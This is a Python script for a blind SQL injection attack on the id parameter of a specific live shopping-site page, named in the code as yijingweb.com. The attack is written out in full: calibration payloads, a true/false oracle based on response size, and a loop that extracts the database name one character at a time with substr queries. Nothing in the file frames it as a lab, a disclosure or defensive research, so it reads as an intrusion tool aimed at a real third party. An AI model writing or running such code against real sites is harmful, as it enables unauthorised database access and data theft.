#!/usr/bin/env python3
"""yijingweb: blind extract DB name using && + substr
Oracle: && (select substr(database(),POS,1)='C') true -> larger, false -> smaller
Calibrate with 1=1 / 1=2 first
"""
import urllib.request, urllib.parse, string, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
BASE = "http://yijingweb.com/webmall/detail.php"
CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase + "_-."

def fetch(url, timeout=12):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, len(r.read())
    except urllib.error.HTTPError as e:
        return e.code, len(e.read(5000))
    except Exception:
        return 0, 0

def sz(payload):
    code, size = fetch(BASE + "?id=686" + payload)
    return size

# calibrate
true_sz = sz("%27%20%26%26%20(select%201)=1--%20")
false_sz = sz("%27%20%26%26%20(select%201)=2--%20")
print("true=%d false=%d" % (true_sz, false_sz), flush=True)
# threshold: true responses should be notably larger
threshold = (true_sz + false_sz) / 2

def is_true(expr):
    payload = "%27%20%26%26%20(" + urllib.parse.quote(expr) + ")--%20"
    s = sz(payload)
    return s > threshold

# quick verify
print("verify len=6:", is_true("select length(database())=6"), flush=True)
print("verify len=7:", is_true("select length(database())=7"), flush=True)

# extract db name
db = ""
for pos in range(1, 15):
    found = False
    for c in CHARS:
        expr = "select substr(database(),%d,1)='%s'" % (pos, c)
        if is_true(expr):
            db += c
            print("pos%d=%s -> %s" % (pos, c, db), flush=True)
            found = True
            break
    if not found:
        db += "?"
        print("pos%d=? -> %s" % (pos, db), flush=True)
    time.sleep(0.2)
print("DATABASE:", db, flush=True)
